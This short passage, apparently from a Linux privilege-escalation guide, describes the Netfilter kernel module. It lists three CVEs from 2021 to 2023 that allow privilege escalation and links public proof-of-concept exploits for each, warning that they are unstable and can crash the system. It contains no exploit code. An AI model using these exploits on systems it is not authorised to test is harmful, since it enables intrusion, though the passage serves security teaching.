When the module is activated, all IP packets are checked by the `Netfilter` before they are forwarded to the target application of the own or remote system. In 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), and also in 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)), several vulnerabilities were found that could lead to privilege escalation.

Please keep in mind that these exploits can be very unstable and can break the system.
